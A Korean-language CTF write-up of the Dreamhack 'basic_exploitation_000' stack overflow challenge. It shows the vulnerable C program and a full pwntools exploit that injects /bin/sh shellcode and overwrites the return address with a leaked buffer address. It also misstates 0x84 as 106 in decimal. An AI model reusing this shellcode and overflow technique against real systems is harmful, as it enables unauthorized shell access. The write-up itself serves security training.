---
title: "[Dreamhack] basic_exploitation_000 Write up"
author: d0razi
date: 2023-08-09 12:30
categories: [InfoSec, Pwn]
tags: [linux, Dreamhack]
image: /assets/img/media/banner/dreamhack.jpg
---

# C 코드

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    printf("buf = (%p)\n", buf);
    scanf("%141s", buf);

    return 0;
}
```

printf에서 buf함수의 주소를 출력해주기때문에 scanf에서 쉘코드를 buf에 삽입해주고 리턴주소까지 더미데이터를 채운다음 리턴주소를 buf의 주소로 바꿔주면 쉘코드를 실행시킬수 있을꺼같다.

---

# 파일 분석

우리가 디버깅을 하면서 알아내야 하는 정보를 정리해보자

- 출력되는 buf의 주소 변수에 담기
- scanf우회 쉘코드
- 리턴까지의 거리

일단 buf의 주소는 pwntools를 사용해 받겠습니다.

scanf우회 쉘코드는 사이트에서 가져왔다. *[출처](https://hackhijack64.tistory.com/38)*

이제 알아야하는건 buf에서 return까지의 거리다. 디버깅을 해서 알아내보자.

디버깅은 peda를 사용했습니다.

![main+28번째 줄을 보면 ebp-0x80 주소를 eax에 옮겨주는걸 볼수있다.](/assets/img/media/post_img/dreamhack/basic_ex_000/Untitled.png)

main+28번째 줄을 보면 ebp-0x80 주소를 eax에 옮겨주는걸 볼수있다.

그래서 난 buf의 위치가 ebp에서부터 0x80만큼 떨어져있다고 생각했다.

만약 buf가 ebp에서부터 0x80만큼 떨어져있다면 0x80+0x4(ebp)만큼 더미데이터를 입력하고 buf의 주소를 입력해주면 될꺼같다.

이제 모든 정보를 얻었으니 익스플로잇 코드를 짜보자.

---

# Exploit

```python
from pwn import *

p = process('./basic_exploitation_000')

p.recvuntil(b'buf = (')
buf_addr = int(p.recv(10),16)

payload = b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80'
payload += b'A' * 106
payload += p32(buf_addr)

p.sendline(payload)
p.interactive()
```

자 일단 순서를 간단하게 말해보자면

1. 출력되는 버프의 주소를 받아서 변수에 넣기
2. 쉘코드를 먼저입력해주고 뒤에 ebp까지 더미데이터를 담기
3. 마지막의 ret값을 buf의 주소로 덮어주기

이렇게 순서가 된다.

코드 초반부분에 p.recvuntil 함수를 사용해서 buf 주소의 앞 문자열을 날려주고 그밑에 int(p.recv(10),16) 코드로 처음부터 10문자를 16진수로 받아서 변수에 담아준다.

그리고 그 밑에는 페이로드의 처음부분을 26바이트 쉘코드를 써주고 0x84(10진수로 106)만큼 더미데이터로 덮어준다. 그리고 그뒤에있는 ret값을 아까받은 buf의 주소로 덮어준다.

![Untitled](/assets/img/media/post_img/dreamhack/basic_ex_000/Untitled%201.png)

실행시키면 쉘이 따진걸 볼 수 있다.